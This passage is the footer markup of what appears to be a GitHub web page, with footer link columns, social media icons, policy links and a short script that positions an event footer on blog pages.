0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"
            ></path>
          </svg>
        </a>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Product</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://github.com/features"
              data-ga-click="Footer, go to features, text:features"
              class="link-item"
              >Features</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/security"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Security</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/team"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Team</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/enterprise"
              data-ga-click="Footer, go to enterprise, text:enterprise"
              class="link-item"
              >Enterprise</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/customer-stories?type=enterprise"
              data-ga-click="Footer, go to customer stories, text:customer stories"
              class="link-item"
              >Customer stories</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/readme"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >The ReadME Project</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/pricing"
              data-ga-click="Footer, go to pricing, text:pricing"
              class="link-item"
              >Pricing</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Resources</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/github/roadmap"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Roadmap</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com/devops/tools/compare/"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item text-nowrap"
              >Compare GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5  col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Platform</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://developer.github.com"
              data-ga-click="Footer, go to api, text:api"
              class="link-item"
              >Developer API</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://partner.github.com/"
              data-ga-click="Footer, go to partner, text:partner"
              class="link-item"
              >Partners</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://atom.io"
              data-ga-click="Footer, go to atom, text:atom"
              class="link-item"
              >Atom</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://electron.atom.io/"
              data-ga-click="Footer, go to electron, text:electron"
              class="link-item"
              >Electron</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://desktop.github.com/"
              data-ga-click="Footer, go to desktop, text:desktop"
              class="link-item"
              >GitHub Desktop</a
            >
          </li>
        </ul>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Support</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to help, text:docs"
              class="link-item"
              href="https://docs.github.com"
              >Docs</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.community"
              data-ga-click="Footer, go to community, text:community"
              class="link-item"
              >Community Forum</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://services.github.com/"
              data-ga-click="Footer, go to professional services, text:professional services"
              class="link-item"
              >Professional Services</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://skills.github.com/"
              data-ga-click="Footer, go to skills, text:skills"
              class="link-item"
              >GitHub Skills</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://githubstatus.com/"
              data-ga-click="Footer, go to status, text:status"
              class="link-item"
              >Status</a
            >
          </li>
          <li class="py-2">
            <a
              data-ga-click="Footer, go to contact, text:contact"
              class="link-item"
              href="https://support.github.com"
              >Contact GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Company</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to about, text:about"
              class="link-item"
              href="https://github.com/about"
              >About</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.blog"
              data-ga-click="Footer, go to blog, text:blog"
              class="link-item"
              >Blog</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Careers</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Press</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Inclusion</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Social Impact</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://shop.github.com"
              data-ga-click="Footer, go to shop, text:shop"
              class="link-item"
              >Shop</a
            >
          </li>
        </ul>
      </div>
    </div>
  </div>
  <div class="bottom-banner">
    <div
      class="container-xl py-4 d-sm-flex flex-wrap flex-justify-between flex-row-reverse flex-items-center"
    >
      <ul
        class="list-style-none d-flex flex-wrap flex-items-center mb-3 mb-sm-0 social-icons"
      >
        <li class="mr-3">
          <a
            href="https://twitter.com/github"
            data-ga-click="Footer, go to Twitter, text:twitter"
            title="GitHub on Twitter"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 273.5 222.3"
              class="d-block"
              height="18"
            >
              <path
                d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.facebook.com/GitHub"
            data-ga-click="Footer, go to Facebook, text:facebook"
            title="GitHub on Facebook"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 15.3 15.4"
              class="d-block"
              height="18"
            >
              <path
                d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.youtube.com/github"
            data-ga-click="Footer, go to YouTube, text:youtube"
            title="GitHub on YouTube"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19.17 13.6"
              class="d-block"
              height="16"
            >
              <path
                d="M18.77 2.13A2.4 2.4 0 0 0 17.09.42C15.59 0 9.58 0 9.58 0a57.55 57.55 0 0 0-7.5.4A2.49 2.49 0 0 0 .39 2.13 26.27 26.27 0 0 0 0 6.8a26.15 26.15 0 0 0 .39 4.67 2.43 2.43 0 0 0 1.69 1.71c1.52.42 7.5.42 7.5.42a57.69 57.69 0 0 0 7.51-.4 2.4 2.4 0 0 0 1.68-1.71 25.63 25.63 0 0 0 .4-4.67 24 24 0 0 0-.4-4.69zM7.67 9.71V3.89l5 2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.linkedin.com/company/github"
            data-ga-click="Footer, go to Linkedin, text:linkedin"
            title="GitHub on Linkedin"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19 18"
              class="d-block"
              height="18"
            >
              <path
                d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li>
          <a
            href="https://github.com/github"
            data-ga-click="Footer, go to github's org, text:github"
            title="GitHub's organization"
          >
            <svg
              height="20"
              class="octicon octicon-mark-github d-block"
              viewBox="0 0 16 16"
              version="1.1"
              width="20"
              aria-hidden="true"
            >
              <path
                fill-rule="evenodd"
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              ></path>
            </svg>
          </a>
        </li>
      </ul>
      <ul class="list-style-none d-flex flex-wrap bottom-links-text">
        <li class="mr-3">
          GitHub Inc. ©
          <!-- -->2024<!-- -->
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-terms-of-service"
            data-ga-click="Footer, go to terms, text:terms"
            class="link-gray"
            >Terms</a
          >
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-privacy-statement"
            data-ga-click="Footer, go to privacy, text:privacy"
            class="link-gray"
            >Privacy</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="#"
            data-ga-click="Footer, go to terms, text:sitemap"
            class="link-gray"
            >Sitemap</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="https://github.com/git-guides"
            data-ga-click="Footer, go to terms, text:what is git"
            class="link-gray"
            >What is Git?</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md"><a href="#" class="link-gray">Manage Cookies</a></li>
        <li class="mr-3 hide-sm hide-md">
          <a href="#" class="link-gray">Do not share my personal information</a>
        </li>
      </ul>
    </div>
  </div>
</footer>


  <!-- JAVASCRIPT -->
  <script src="/assets/js/main.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      if (document.body.classList.contains('page-blog')) {

      const eventFooter = document.querySelector('.event-footer');
      const mainFooter = document.querySelector('footer'); // Adjust this selector to match your footer element

      function checkFooterPosition() {
        const footerRect = mainFooter.getBoundingClientRect();
        const eventFooterRect = eventFooter.getBoundingClientRect();

        if (footerRect.top < window.innerHeight && footerRect.bottom >= 0) {
          eventFooter.style.position = 'relative';
          eventFooter.style.bottom = `0px`;
        } else {
          eventFooter.style.position = 'fixed';
          eventFooter.style.bottom = '0';
        }
      }

      window.addEventListener('scroll', checkFooterPosition);
      window.addEventListener('resize', checkFooterPosition);
      checkFooterPosition(); // Initial check
    }
    });
  </script>
</body>
</html>
